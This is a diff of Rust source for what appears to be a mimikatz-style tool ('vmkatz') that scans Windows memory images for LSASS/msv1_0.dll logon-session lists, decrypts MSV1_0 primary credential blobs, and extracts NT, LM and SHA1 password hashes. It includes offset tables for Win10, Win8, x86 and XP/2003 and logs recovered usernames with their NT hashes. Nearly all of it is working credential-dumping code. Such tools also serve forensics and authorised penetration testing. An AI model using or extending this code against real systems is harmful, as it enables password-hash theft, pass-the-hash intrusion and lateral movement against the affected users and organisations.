@@ -1350,7 +1849,7 @@ fn extract_primary_credential(
                 return Ok(RawPrimaryCred {
                     lm_hash,
                     nt_hash,
-                    sha1_hash: computed_sha1,
+                    sha1_hash: final_sha1,
                 });
             }
         }
@@ -1361,9 +1860,9 @@ fn extract_primary_credential(
     let mut entropy_candidates: Vec<(usize, u32, RawPrimaryCred)> = Vec::new();
 
     for (vi, offsets) in PRIMARY_CRED_OFFSET_VARIANTS.iter().enumerate() {
-        let nt_off = offsets.nt_hash as usize;
-        let lm_off = offsets.lm_hash as usize;
-        let sha1_off = offsets.sha1_hash as usize;
+        let nt_off = offsets.nt_hash;
+        let lm_off = offsets.lm_hash;
+        let sha1_off = offsets.sha1_hash;
 
         if decrypted.len() < sha1_off + 20 {
             continue;
@@ -1397,6 +1896,10 @@ fn extract_primary_credential(
         }
 
         // SHA1 field doesn't match — collect as entropy candidate if NT looks hash-like.
+        // Reject if LM == NT (both non-zero): impossible for real creds (different algorithms).
+        if lm_hash != [0u8; 16] && lm_hash == nt_hash {
+            continue;
+        }
         if looks_like_hash(&nt_hash) {
             // Score structural plausibility of this variant by checking boolean flag area
             let struct_score = structural_score(&decrypted, offsets);
@@ -1404,29 +1907,46 @@ fn extract_primary_credential(
                 "  Candidate primary cred offset variant {} (nt=0x{:x}) [entropy ok, SHA1 mismatch, struct_score={}]",
                 vi, offsets.nt_hash, struct_score
             );
-            let computed_sha1 = sha1_digest(&nt_hash);
+            // Use SHA1 from blob (ShaOwPassword). For human accounts this is
+            // SHA1(UTF16LE(password)), not SHA1(NT_hash). Only compute SHA1(NT)
+            // as fallback if the blob's sha1 field is zeroed.
+            let final_sha1 = if sha1_hash == [0u8; 20] {
+                sha1_digest(&nt_hash)
+            } else {
+                sha1_hash
+            };
             entropy_candidates.push((
                 vi,
                 struct_score,
                 RawPrimaryCred {
                     lm_hash,
                     nt_hash,
-                    sha1_hash: computed_sha1,
+                    sha1_hash: final_sha1,
                 },
             ));
         }
     }
 
-    // DPAPI cross-check: when isDPAPIProtected=1, the 16 bytes at offset 0x6A are
-    // the DPAPI Protected hash, NOT the NT hash. Reject any entropy candidate whose
+    // DPAPI cross-check: when isDPAPIProtected=1, the 16 bytes at DPAPI_PROTECTED_HASH_OFF
+    // are the DPAPI Protected hash, NOT the NT hash. Reject any entropy candidate whose
     // NT hash matches that field — it's reading the wrong data.
-    if best_result.is_none() && !entropy_candidates.is_empty() && decrypted.len() >= 0x7A {
-        let flags_look_valid = decrypted.len() >= 0x2D
-            && decrypted[0x28..0x2D].iter().all(|&b| b <= 1);
-        let is_dpapi_protected = flags_look_valid && decrypted[0x2C] == 1;
+    //
+    // MSV1_0_PRIMARY_CREDENTIAL boolean flags layout (Win10+):
+    //   +0x28..+0x2D: 5 boolean flags (isNtOwfPassword, isLmOwfPassword, isShaOwPassword,
+    //                 isDPAPIProtected, isIso) — each 0 or 1 in valid decryptions
+    const FLAGS_START: usize = 0x28;
+    const FLAGS_END: usize = 0x2D;
+    const DPAPI_PROTECTED_FLAG: usize = 0x2C;
+    const DPAPI_PROTECTED_HASH_OFF: usize = 0x6A;
+    const DPAPI_PROTECTED_HASH_END: usize = 0x7A;
+
+    if best_result.is_none() && !entropy_candidates.is_empty() && decrypted.len() >= DPAPI_PROTECTED_HASH_END {
+        let flags_look_valid = decrypted.len() >= FLAGS_END
+            && decrypted[FLAGS_START..FLAGS_END].iter().all(|&b| b <= 1);
+        let is_dpapi_protected = flags_look_valid && decrypted[DPAPI_PROTECTED_FLAG] == 1;
 
         if is_dpapi_protected {
-            let dpapi_field = &decrypted[0x6A..0x7A]; // 16 bytes at DPAPIProtected offset
+            let dpapi_field = &decrypted[DPAPI_PROTECTED_HASH_OFF..DPAPI_PROTECTED_HASH_END];
             let before = entropy_candidates.len();
             entropy_candidates.retain(|(vi, _, cred)| {
                 if cred.nt_hash[..] == dpapi_field[..] {
@@ -1452,22 +1972,36 @@ fn extract_primary_credential(
     // Use SHA1-validated result, or best entropy-based result.
     // Among entropy candidates, prefer those with higher structural scores (boolean flag validation).
     if best_result.is_none() && !entropy_candidates.is_empty() {
-        // Sort by struct_score descending, then by variant index ascending (canonical first)
-        entropy_candidates.sort_by(|a, b| b.1.cmp(&a.1).then(a.0.cmp(&b.0)));
-        let (vi, score, _) = &entropy_candidates[0];
-        log::info!(
-            "  Using primary cred offset variant {} [entropy-based, SHA1 computed, struct_score={}]",
-            vi, score
-        );
-        // Also remember this variant for future credentials (less confident than SHA1)
-        if *score >= 10 {
-            *validated_variant = Some(*vi);
+        // Reject candidates with struct_score=0: the boolean flags at 0x28..0x2D
+        // (Win10+) must all be 0 or 1 in a real decrypted credential blob. Random/garbage
+        // data almost never passes this check (p ≈ (2/256)^5 ≈ 3e-11).
+        let before = entropy_candidates.len();
+        entropy_candidates.retain(|&(_, score, _)| score > 0);
+        if entropy_candidates.len() < before {
+            log::info!(
+                "  Structural filter: rejected {} candidates with struct_score=0",
+                before - entropy_candidates.len()
+            );
         }
-        best_result = Some(entropy_candidates.swap_remove(0).2);
+
+        if !entropy_candidates.is_empty() {
+            // Sort by struct_score descending, then by variant index ascending (canonical first)
+            entropy_candidates.sort_by(|a, b| b.1.cmp(&a.1).then(a.0.cmp(&b.0)));
+            let (vi, score, _) = &entropy_candidates[0];
+            log::info!(
+                "  Using primary cred offset variant {} [entropy-based, SHA1 computed, struct_score={}]",
+                vi, score
+            );
+            // Also remember this variant for future credentials (less confident than SHA1)
+            if *score >= 10 {
+                *validated_variant = Some(*vi);
+            }
+            best_result = Some(entropy_candidates.swap_remove(0).2);
+        }
     }
 
     best_result.ok_or_else(|| {
-        crate::error::GovmemError::DecryptionError(
+        crate::error::VmkatzError::DecryptionError(
             "No offset variant matched (SHA1 cross-validation and entropy check both failed)"
                 .to_string(),
         )
@@ -1481,9 +2015,18 @@ fn extract_primary_credential(
 /// Key insight: Win10 1607+ with isDPAPIProtected stores a 20-byte SHA/DPAPI
 /// field at +0x36 BEFORE the actual hashes, shifting NT to +0x4A.
 /// Detected by: data at 0x36 matching first 16B of data at 0x6A.
+///
+/// Boolean flag layout in MSV1_0_PRIMARY_CREDENTIAL (Win10 1607+):
+///   +0x28: isIso           (BOOLEAN) — Credential Guard isolation flag
+///   +0x29: isNtOwfPassword (BOOLEAN) — NT hash is present
+///   +0x2A: isLmOwfPassword (BOOLEAN) — LM hash is present
+///   +0x2B: isShaOwPassword (BOOLEAN) — SHA1 hash is present
+///   +0x2C: isDPAPIProtected (BOOLEAN) — DPAPI-shifted layout active
+/// For Win10 1507/1511, flags start at +0x20 with the same relative order:
+///   +0x20: isIso, +0x21: isNtOwfPassword, +0x22: isLmOwfPassword, +0x23: isShaOwPassword
 fn structural_score(blob: &[u8], offsets: &PrimaryCredOffsets) -> u32 {
-    let nt_off = offsets.nt_hash as usize;
-    let lm_off = offsets.lm_hash as usize;
+    let nt_off = offsets.nt_hash;
+    let lm_off = offsets.lm_hash;
     let mut score = 0u32;
 
     // Check if this blob has the DPAPI-shifted layout (NT at 0x4A instead of 0x36).
@@ -1510,22 +2053,22 @@ fn structural_score(blob: &[u8], offsets: &PrimaryCredOffsets) -> u32 {
                 // Data at 0x36 is SHA/DPAPI material, NOT the NT hash → invalidate
                 return 0;
             }
-            let flags = &blob[0x28..0x2D];
+            let flags = &blob[0x28..0x2D]; // isIso..isDPAPIProtected
             let all_bool = flags.iter().all(|&b| b <= 1);
             if all_bool {
                 score += 10;
-                if blob[0x29] == 1 {
+                if blob[0x29] == 1 { // isNtOwfPassword == true
                     score += 5;
                 }
             }
         }
         // Win10 1507/1511
         0x28 if blob.len() >= 0x28 => {
-            let flags = &blob[0x20..0x24];
+            let flags = &blob[0x20..0x24]; // isIso..isShaOwPassword
             let all_bool = flags.iter().all(|&b| b <= 1);
             if all_bool {
                 score += 10;
-                if blob[0x21] == 1 {
+                if blob[0x21] == 1 { // isNtOwfPassword == true
                     score += 5;
                 }
             }
@@ -1539,11 +2082,11 @@ fn structural_score(blob: &[u8], offsets: &PrimaryCredOffsets) -> u32 {
             if dpapi_shifted {
                 return 0;
             } // Same DPAPI issue
-            let flags = &blob[0x28..0x2D];
+            let flags = &blob[0x28..0x2D]; // isIso..isDPAPIProtected
             let all_bool = flags.iter().all(|&b| b <= 1);
             if all_bool {
                 score += 8;
-                if blob[0x29] == 1 {
+                if blob[0x29] == 1 { // isNtOwfPassword == true
                     score += 3;
                 }
             }
@@ -1553,11 +2096,11 @@ fn structural_score(blob: &[u8], offsets: &PrimaryCredOffsets) -> u32 {
             if dpapi_shifted {
                 // DPAPI layout confirmed: validate flags and boost score
                 if blob.len() >= 0x2D {
-                    let flags = &blob[0x28..0x2D];
+                    let flags = &blob[0x28..0x2D]; // isIso..isDPAPIProtected
                     let all_bool = flags.iter().all(|&b| b <= 1);
                     if all_bool {
                         score += 15; // Strong structural match
-                        if blob[0x29] == 1 {
+                        if blob[0x29] == 1 { // isNtOwfPassword == true
                             score += 5;
                         }
                     }
@@ -1594,70 +2137,713 @@ fn looks_like_hash(data: &[u8; 16]) -> bool {
     if utf16_pattern >= 5 {
         return false; // Strongly resembles UTF-16LE text
     }
+    // Reject repeating byte patterns (decryption artifacts from garbage/paged data).
+    // Real MD4 hashes essentially never have an 8-byte cycle (p ≈ 2^-64).
+    if is_repeating_pattern(data) {
+        return false;
+    }
     true
+}
+
+/// Public wrapper for cross-module use (kerberos.rs).
+pub fn is_repeating_pattern_pub(data: &[u8]) -> bool {
+    is_repeating_pattern(data)
+}
+
+/// Detect repeating byte patterns with cycle lengths 1, 2, 4, or 8.
+/// Garbage decryption often produces short repeating cycles
+/// (e.g., `65a09c76aa8aa167` repeated to fill the field).
+fn is_repeating_pattern(data: &[u8]) -> bool {
+    for cycle_len in [1, 2, 4, 8] {
+        if data.len() >= cycle_len * 2 {
+            let pattern = &data[..cycle_len];
+            if data.chunks(cycle_len).all(|c| c == pattern) {
+                return true;
+            }
+        }
+    }
+    false
 }
 
 /// Minimal inline SHA-1 for cross-validating NT hash against SHA1 field.
 /// Avoids external crate dependency.
-fn sha1_digest(data: &[u8]) -> [u8; 20] {
-    let (mut h0, mut h1, mut h2, mut h3, mut h4) = (
-        0x67452301u32,
-        0xEFCDAB89u32,
-        0x98BADCFEu32,
-        0x10325476u32,
-        0xC3D2E1F0u32,
-    );
-    let bit_len = (data.len() as u64) * 8;
-    let mut msg = data.to_vec();
-    msg.push(0x80);
-    while msg.len() % 64 != 56 {
-        msg.push(0);
+use crate::utils::sha1_digest;
+
+// ---------------------------------------------------------------------------
+// Pre-Vista MSV credential extraction (WinXP, Win2003)
+// ---------------------------------------------------------------------------
+
+/// Pre-Vista MSV1_0 list entry offsets (32-bit structures).
+struct PreVistaMsvOffsets {
+    flink: u64,
+    luid: u64,
+    username: u64,  // 32-bit UNICODE_STRING
+    domain: u64,    // 32-bit UNICODE_STRING
+    credentials_ptr: u64,  // 32-bit pointer to primary credential
+}
+
+/// Known pre-Vista MSV offset variants.
+const PREVISTA_MSV_OFFSETS: &[PreVistaMsvOffsets] = &[
+    // NT5 (XP SP3 / Win2003 SP2) from mimikatz KIWI_MSV1_0_LIST_51
+    // LUID at +0x08, UserName at +0x10, Domain at +0x18, pCredentials at +0x44
+    PreVistaMsvOffsets {
+        flink: 0,
+        luid: 0x08,
+        username: 0x10,
+        domain: 0x18,
+        credentials_ptr: 0x44,
+    },
+    // Win2003 R2 SP2 x86 (NTLM credential entries — LUID after "NTLM" signature)
+    PreVistaMsvOffsets {
+        flink: 0,
+        luid: 0x0C,
+        username: 0x20,
+        domain: 0x28,
+        credentials_ptr: 0x1C,
+    },
+    // WinXP SP3 x86 variant
+    PreVistaMsvOffsets {
+        flink: 0,
+        luid: 0x10,
+        username: 0x20,
+        domain: 0x30,
+        credentials_ptr: 0x50,
+    },
+];
+
+/// Pre-Vista primary credential layout (simpler than Vista+).
+/// After decryption, the blob contains:
+///   offset 0x00: LogonDomainName (UNICODE_STRING32 — 8 bytes: len, maxlen, buffer)
+///   offset 0x08: UserName (UNICODE_STRING32 — 8 bytes)
+///   offset 0x10: NtOwfPassword (16 bytes)
+///   offset 0x20: LmOwfPassword (16 bytes)
+const PREVISTA_NT_HASH_OFFSET: usize = 0x10;
+const PREVISTA_LM_HASH_OFFSET: usize = 0x20;
+
+/// Extract pre-Vista MSV credentials from msv1_0.dll using 32-bit structures.
+pub fn extract_prevista_msv_credentials(
+    vmem: &dyn VirtualMemory,
+    msv_base: u64,
+    _msv_size: u64,
+    keys: &PreVistaCryptoKeys,
+) -> Result<Vec<(u64, MsvCredential)>> {
+    let pe = PeHeaders::parse_from_memory(vmem, msv_base)?;
+
+    let text = pe
+        .find_section(".text")
+        .ok_or_else(|| VmkatzError::PatternNotFound(".text in msv1_0.dll (pre-Vista)".to_string()))?;
+
+    // Find LogonSessionList head using pattern matching
+    let list_addrs = find_prevista_logon_session_list(vmem, &pe, msv_base, text.virtual_address as u64, text.virtual_size)?;
+
+    let mut results = Vec::new();
+
+    for list_addr in &list_addrs {
+        for offsets in PREVISTA_MSV_OFFSETS {
+            let mut creds = walk_prevista_msv_list(vmem, *list_addr, offsets, keys);
+            if !creds.is_empty() {
+                results.append(&mut creds);
+                // Found working combo, stop trying more list+offset combos
+                log::info!(
+                    "Pre-Vista MSV: extracted {} credentials from list 0x{:x}",
+                    results.len(), list_addr
+                );
+                return Ok(results);
+            }
+        }
     }
-    msg.extend_from_slice(&bit_len.to_be_bytes());
-    for block in msg.chunks(64) {
-        let mut w = [0u32; 80];
-        for i in 0..16 {
-            w[i] = u32::from_be_bytes([
-                block[i * 4],
-                block[i * 4 + 1],
-                block[i * 4 + 2],
-                block[i * 4 + 3],
-            ]);
+
+    // Fallback: scan .data section for list candidates
+    if let Some(data_sect) = pe.find_section(".data") {
+        let data_base = msv_base + data_sect.virtual_address as u64;
+        let data_size = data_sect.virtual_size as usize;
+        log::debug!(
+            "Pre-Vista MSV .data scan: base=0x{:x} size=0x{:x}",
+            data_base, data_size
+        );
+        let data = vmem.read_virt_bytes(data_base, data_size)?;
+
+        let mut candidate_count = 0u32;
+        for off in (0..data.len().saturating_sub(4)).step_by(4) {
+            let flink = super::types::read_u32_le(&data, off).unwrap_or(0) as u64;
+            if !(0x10000..=0x80000000).contains(&flink) {
+                continue;
+            }
+            let list_addr = data_base + off as u64;
+            // Check if it's a valid LIST_ENTRY (flink's blink points back)
+            if let Ok(blink) = vmem.read_virt_u32(flink + 4) {
+                if blink as u64 != list_addr {
+                    continue;
+                }
+                candidate_count += 1;
+                log::debug!(
+                    "Pre-Vista MSV: LIST_ENTRY candidate at 0x{:x} -> flink=0x{:x}",
+                    list_addr, flink
+                );
+            } else {
+                continue;
+            }
+
+            for offsets in PREVISTA_MSV_OFFSETS {
+                let mut creds = walk_prevista_msv_list(vmem, list_addr, offsets, keys);
+                if !creds.is_empty() {
+                    results.append(&mut creds);
+                    return Ok(results);
+                }
+            }
         }
-        for i in 16..80 {
-            w[i] = (w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]).rotate_left(1);
-        }
-        let (mut a, mut b, mut c, mut d, mut e) = (h0, h1, h2, h3, h4);
-        for (i, &wi) in w.iter().enumerate() {
-            let (f, k) = match i {
-                0..=19 => ((b & c) | ((!b) & d), 0x5A827999u32),
-                20..=39 => (b ^ c ^ d, 0x6ED9EBA1u32),
-                40..=59 => ((b & c) | (b & d) | (c & d), 0x8F1BBCDCu32),
-                _ => (b ^ c ^ d, 0xCA62C1D6u32),
-            };
-            let temp = a
-                .rotate_left(5)
-                .wrapping_add(f)
-                .wrapping_add(e)
-                .wrapping_add(k)
-                .wrapping_add(wi);
-            e = d;
-            d = c;
-            c = b.rotate_left(30);
-            b = a;
-            a = temp;
-        }
-        h0 = h0.wrapping_add(a);
-        h1 = h1.wrapping_add(b);
-        h2 = h2.wrapping_add(c);
-        h3 = h3.wrapping_add(d);
-        h4 = h4.wrapping_add(e);
+        log::debug!("Pre-Vista MSV: {} LIST_ENTRY candidates tried, none yielded credentials", candidate_count);
+    } else {
+        log::debug!("Pre-Vista MSV: no .data section in msv1_0.dll");
     }
-    let mut r = [0u8; 20];
-    r[0..4].copy_from_slice(&h0.to_be_bytes());
-    r[4..8].copy_from_slice(&h1.to_be_bytes());
-    r[8..12].copy_from_slice(&h2.to_be_bytes());
-    r[12..16].copy_from_slice(&h3.to_be_bytes());
-    r[16..20].copy_from_slice(&h4.to_be_bytes());
-    r
+
+    if results.is_empty() {
+        Err(VmkatzError::PatternNotFound("Pre-Vista LogonSessionList".to_string()))
+    } else {
+        Ok(results)
+    }
+}
+
+/// Find LogonSessionList head addresses in pre-Vista msv1_0.dll.
+fn find_prevista_logon_session_list(
+    vmem: &dyn VirtualMemory,
+    pe: &PeHeaders,
+    msv_base: u64,
+    text_rva: u64,
+    text_size: u32,
+) -> Result<Vec<u64>> {
+    let text_base = msv_base + text_rva;
+    let mut candidates = Vec::new();
+
+    // Try pattern-based detection
+    if let Ok((pattern_addr, _pat_idx)) = patterns::find_pattern(
+        vmem,
+        text_base,
+        text_size,
+        patterns::PREVISTA_MSV_LOGON_SESSION_PATTERNS,
+        "PreVista-LogonSessionList",
+    ) {
+        // Scan near pattern for absolute address references
+        // In x86 code, list address is usually loaded via: MOV reg, [abs_addr] or LEA reg, [abs_addr]
+        let code = vmem.read_virt_bytes(pattern_addr.saturating_sub(0x40), 0x100)?;
+        let code_base = pattern_addr.saturating_sub(0x40);
+
+        for i in 0..code.len().saturating_sub(5) {
+            // Look for MOV reg, [imm32] patterns: A1 xx xx xx xx (MOV EAX, [abs])
+            // or 8B 0D/15/35 xx xx xx xx (MOV ECX/EDX/ESI, [abs])
+            let is_mov_abs = code[i] == 0xA1
+                || (code[i] == 0x8B && matches!(code.get(i + 1), Some(0x0D | 0x15 | 0x1D | 0x35 | 0x3D)));
+
+            if is_mov_abs {
+                let addr_off = if code[i] == 0xA1 { i + 1 } else { i + 2 };
+                if addr_off + 4 > code.len() {
+                    continue;
+                }
+                let abs_addr = super::types::read_u32_le(&code, addr_off).unwrap_or(0) as u64;
+                // Validate: should be in .data section range
+                if let Some(data_sect) = pe.find_section(".data") {
+                    let data_start = msv_base + data_sect.virtual_address as u64;
+                    let data_end = data_start + data_sect.virtual_size as u64;
+                    if abs_addr >= data_start && abs_addr < data_end {
+                        // Verify it looks like a LIST_ENTRY head
+                        if let Ok(flink) = vmem.read_virt_u32(abs_addr) {
+                            let flink64 = flink as u64;
+                            if flink64 == abs_addr || (0x10000..0x80000000).contains(&flink64) {
+                                candidates.push(abs_addr);
+                            }
+                        }
+                    }
+                }
+                let _ = code_base;
+            }
+        }
+    }
+
+    if candidates.is_empty() {
+        log::debug!("Pre-Vista: no pattern-based LogonSessionList found, using .data scan only");
+    }
+
+    Ok(candidates)
+}
+
+/// Walk a pre-Vista MSV linked list using 32-bit pointers.
+fn walk_prevista_msv_list(
+    vmem: &dyn VirtualMemory,
+    list_addr: u64,
+    offsets: &PreVistaMsvOffsets,
+    keys: &PreVistaCryptoKeys,
+) -> Vec<(u64, MsvCredential)> {
+    let mut results = Vec::new();
+    let mut visited = std::collections::HashSet::new();
+    visited.insert(list_addr);
+
+    // Read first Flink
+    let mut current = match vmem.read_virt_u32(list_addr + offsets.flink) {
+        Ok(f) => f as u64,
+        Err(_) => return results,
+    };
+
+    let max_entries = 100;
+    for iter in 0..max_entries {
+        if current == list_addr || current == 0 || current < 0x10000 {
+            break;
+        }
+        if visited.contains(&current) {
+            break;
+        }
+        visited.insert(current);
+
+        // Read LUID (still u64 even on 32-bit — LUID is two DWORDs)
+        let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
+
+        // Read username and domain using 32-bit UNICODE_STRING
+        let username = vmem.read_win_unicode_string_32(current + offsets.username).unwrap_or_default();
+        let domain = vmem.read_win_unicode_string_32(current + offsets.domain).unwrap_or_default();
+
+        // Read credentials pointer (32-bit)
+        let cred_ptr = match vmem.read_virt_u32(current + offsets.credentials_ptr) {
+            Ok(p) => p as u64,
+            Err(_) => {
+                // Move to next entry
+                current = vmem.read_virt_u32(current + offsets.flink).unwrap_or(0) as u64;
+                continue;
+            }
+        };
+
+        log::debug!(
+            "Pre-Vista MSV walk[{}]: entry=0x{:x} luid=0x{:x} user='{}' domain='{}' cred_ptr=0x{:x}",
+            iter, current, luid, username, domain, cred_ptr
+        );
+
+        if cred_ptr >= 0x10000 && !username.is_empty() {
+            // Extract primary credential
+            if let Some(cred) = extract_prevista_primary_credential(vmem, cred_ptr, keys, &username, &domain) {
+                log::info!(
+                    "Pre-Vista MSV: LUID=0x{:x} {}\\{} NT={}",
+                    luid, domain, username, hex::encode(cred.nt_hash)
+                );
+                results.push((luid, cred));
+            }
+        }
+
+        // Move to next entry
+        current = vmem.read_virt_u32(current + offsets.flink).unwrap_or(0) as u64;
+    }
+
+    results
+}
+
+/// Extract and decrypt a pre-Vista primary credential.
+fn extract_prevista_primary_credential(
+    vmem: &dyn VirtualMemory,
+    cred_ptr: u64,
+    keys: &PreVistaCryptoKeys,
+    username: &str,
+    domain: &str,
+) -> Option<MsvCredential> {
+    // Pre-Vista primary credential structure:
+    // At cred_ptr: the encrypted blob pointer and size
+    // Layout varies, but typically:
+    //   +0x00: UNICODE_STRING Domain (32-bit: 8 bytes)
+    //   +0x08: UNICODE_STRING UserName (32-bit: 8 bytes)
+    //   +0x10: encrypted NT hash (16 bytes) or encrypted blob pointer
+    //
+    // Actually, in NT5, the structure at cred_ptr typically contains:
+    //   Primary UNICODE_STRING at +0 (identifies "Primary" type)
+    //   Then an encrypted blob at a known offset
+    //
+    // Two approaches:
+    // 1. Direct hash reading at cred_ptr + offset (if not encrypted)
+    // 2. Encrypted blob with DES-X-CBC/RC4 decryption
+
+    // Try approach 1: read encrypted blob pointer
+    // Pre-Vista stores encrypted credentials at cred_ptr+0x10 (size) and cred_ptr+0x14 (ptr)
+    let enc_size = vmem.read_virt_u32(cred_ptr + 0x10).ok()? as usize;
+    let enc_ptr = vmem.read_virt_u32(cred_ptr + 0x14).ok()? as u64;
+
+    if enc_size == 0 || enc_size > 0x1000 || enc_ptr < 0x10000 {
+        // Try alternative layout: size at +0x18, ptr at +0x1C
+        let enc_size2 = vmem.read_virt_u32(cred_ptr + 0x18).ok()? as usize;
+        let enc_ptr2 = vmem.read_virt_u32(cred_ptr + 0x1C).ok()? as u64;
+
+        if enc_size2 > 0 && enc_size2 <= 0x1000 && enc_ptr2 >= 0x10000 {
+            return decrypt_and_extract_prevista_hashes(vmem, enc_ptr2, enc_size2, keys, username, domain);
+        }
+
+        // Try approach 2: the entire struct at cred_ptr is the encrypted blob
+        // Some NT5 variants embed the encrypted data inline
+        if enc_size > 0 && enc_size <= 0x200 {
+            let inline_data = vmem.read_virt_bytes(cred_ptr, enc_size).ok()?;
+            if let Ok(decrypted) = crate::lsass::crypto::decrypt_credential_prevista(keys, &inline_data) {
+                return extract_hashes_from_prevista_blob(&decrypted, username, domain);
+            }
+        }
+
+        return None;
+    }
+
+    decrypt_and_extract_prevista_hashes(vmem, enc_ptr, enc_size, keys, username, domain)
+}
+
+/// Decrypt an encrypted pre-Vista credential blob and extract NT/LM hashes.
+fn decrypt_and_extract_prevista_hashes(
+    vmem: &dyn VirtualMemory,
+    enc_ptr: u64,
+    enc_size: usize,
+    keys: &PreVistaCryptoKeys,
+    username: &str,
+    domain: &str,
+) -> Option<MsvCredential> {
+    let encrypted = vmem.read_virt_bytes(enc_ptr, enc_size).ok()?;
+    let decrypted = crate::lsass::crypto::decrypt_credential_prevista(keys, &encrypted).ok()?;
+    extract_hashes_from_prevista_blob(&decrypted, username, domain)
+}
+
+/// Extract NT/LM hashes from a decrypted pre-Vista credential blob.
+fn extract_hashes_from_prevista_blob(
+    decrypted: &[u8],
+    username: &str,
+    domain: &str,
+) -> Option<MsvCredential> {
+    // Need at least 0x30 bytes (NT hash at 0x10 + LM hash at 0x20)
+    if decrypted.len() < 0x30 {
+        return None;
+    }
+
+    let nt_hash: [u8; 16] = decrypted[PREVISTA_NT_HASH_OFFSET..PREVISTA_NT_HASH_OFFSET + 16]
+        .try_into()
+        .ok()?;
+    let lm_hash: [u8; 16] = decrypted[PREVISTA_LM_HASH_OFFSET..PREVISTA_LM_HASH_OFFSET + 16]
+        .try_into()
+        .ok()?;
+
+    // Validate: NT hash should not be all zeros (unless it's a blank password)
+    // At minimum, check that we have something non-trivial
+    if nt_hash == [0u8; 16] && lm_hash == [0u8; 16] {
+        return None;
+    }
+
+    Some(MsvCredential {
+        username: username.to_string(),
+        domain: domain.to_string(),
+        nt_hash,
+        lm_hash,
+        sha1_hash: [0u8; 20], // Pre-Vista doesn't store SHA1
+    })
+}
+
+// -- x86-aware variants --
+
+/// x86 MSV offset variants.
+/// On x86, pointers are 4 bytes and UNICODE_STRINGs are 8 bytes, shifting all fields.
+const MSV_OFFSET_VARIANTS_X86: &[MsvOffsets] = &[
+    // Variant 0: NlpActiveLogon x86 (Win10 19041+)
+    // Flink(4)+Blink(4)+refs(8)+LUID(8) = LUID at +0x10
+    // username at +0x20 (x86 UNICODE_STRING=8B), domain at +0x28
+    MsvOffsets {
+        flink: 0x00,
+        luid: 0x18,
+        username: 0x28,
+        domain: 0x30,
+        credentials_ptr: 0,
+        logon_type: 0x20,
+        session_id: 0x24,
+        logon_time: 0,
+        logon_server: 0x38,
+        sid: 0x48,
+        sid_embedded: true,
+    },
+    // Variant 1: KIWI_MSV1_0_LIST_63 x86 (Win10 10240-22H2)
+    // LIST_ENTRY(8)+unk0-5(6*4=24)+pad+LUID = LUID at ~0x3C
+    MsvOffsets {
+        flink: 0x00,
+        luid: 0x3C,
+        username: 0x4C,
+        domain: 0x54,
+        credentials_ptr: 0x84,
+        logon_type: 0x70,
+        session_id: 0x78,
+        logon_time: 0x7C,
+        logon_server: 0x5C,
+        sid: 0x68,
+        sid_embedded: false,
+    },
+    // Variant 2: LIST_62 x86 (Win8)
+    MsvOffsets {
+        flink: 0x00,
+        luid: 0x3C,
+        username: 0x44,
+        domain: 0x4C,
+        credentials_ptr: 0x7C,
+        logon_type: 0x68,
+        session_id: 0x70,
+        logon_time: 0x74,
+        logon_server: 0x54,
+        sid: 0x60,
+        sid_embedded: false,
+    },
+];
+
+/// Extract MSV sessions — architecture-aware.
+pub fn extract_msv_sessions_arch(
+    vmem: &dyn VirtualMemory,
+    msv_base: u64,
+    msv_size: u32,
+    build_number: u32,
+    arch: Arch,
+) -> Vec<MsvSessionInfo> {
+    if arch == Arch::X64 {
+        return extract_msv_sessions(vmem, msv_base, msv_size, build_number);
+    }
+
+    let pe = match PeHeaders::parse_from_memory(vmem, msv_base) {
+        Ok(p) => p,
+        Err(_) => return Vec::new(),
+    };
+
+    // For x86, try .data section scan for linked list / hash table
+    let mut sessions = Vec::new();
+
+    let variants = MSV_OFFSET_VARIANTS_X86;
+
+    // Try to find the list in .data
+    if let Some(data_sec) = pe.find_section(".data") {
+        let data_base = msv_base + data_sec.virtual_address as u64;
+        let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
+        if let Ok(data) = vmem.read_virt_bytes(data_base, data_size) {
+            // Scan for LIST_ENTRY heads with 4-byte pointers
+            for off in (0..data_size.saturating_sub(8)).step_by(4) {
+                let flink = super::types::read_u32_le(&data, off).unwrap_or(0) as u64;
+                let blink = super::types::read_u32_le(&data, off + 4).unwrap_or(0) as u64;
+
+                let list_addr = data_base + off as u64;
+
+                if flink == list_addr && blink == list_addr { continue; }
+                if !is_valid_user_ptr(flink, arch) || !is_valid_user_ptr(blink, arch) { continue; }
+                if flink >= msv_base && flink < msv_base + 0x100000 { continue; }
+
+                // Try each variant
+                for variant in variants {
+                    let mut current = flink;
+                    let mut visited = std::collections::HashSet::new();
+                    let mut found = false;
+
+                    while current != list_addr && !visited.contains(&current) && current != 0 {
+                        visited.insert(current);
+
+                        let luid = vmem.read_virt_u64(current + variant.luid).unwrap_or(0);
+                        if luid == 0 || luid > 0xFFFF_FFFF {
+                            break;
+                        }
+
+                        let username = read_ustring(vmem, current + variant.username, arch).unwrap_or_default();
+                        let domain = read_ustring(vmem, current + variant.domain, arch).unwrap_or_default();
+
+                        if !username.is_empty() && username.len() < 256 {
+                            found = true;
+
+                            let logon_type = vmem.read_virt_u32(current + variant.logon_type).unwrap_or(0);
+                            let session_id = vmem.read_virt_u32(current + variant.session_id).unwrap_or(0);
+                            let logon_time = if variant.logon_time > 0 {
+                                vmem.read_virt_u64(current + variant.logon_time).unwrap_or(0)
+                            } else { 0 };
+                            let logon_server = if variant.logon_server > 0 {
+                                read_ustring(vmem, current + variant.logon_server, arch).unwrap_or_default()
+                            } else { String::new() };
+
+                            sessions.push(MsvSessionInfo {
+                                luid,
+                                username,
+                                domain,
+                                logon_type,
+                                session_id,
+                                logon_time,
+                                logon_server,
+                                sid: String::new(),
+                            });
+                        }
+
+                        current = match read_ptr(vmem, current + variant.flink, arch) {
+                            Ok(f) => f,
+                            Err(_) => break,
+                        };
+                    }
+
+                    if found {
+                        log::info!("MSV x86: found sessions via .data scan (variant {})", variants.iter().position(|v| std::ptr::eq(v, variant)).unwrap_or(0));
+                        return sessions;
+                    }
+                }
+            }
+        }
+    }
+
+    sessions
+}
+
+/// Extract MSV credentials — architecture-aware.
+pub fn extract_msv_credentials_arch(
+    vmem: &dyn VirtualMemory,
+    msv_base: u64,
+    _msv_size: u32,
+    keys: &CryptoKeys,
+    build_number: u32,
+    arch: Arch,
+) -> Result<Vec<(u64, MsvCredential)>> {
+    if arch == Arch::X64 {
+        return extract_msv_credentials(vmem, msv_base, _msv_size, keys, build_number);
+    }
+
+    let pe = PeHeaders::parse_from_memory(vmem, msv_base)?;
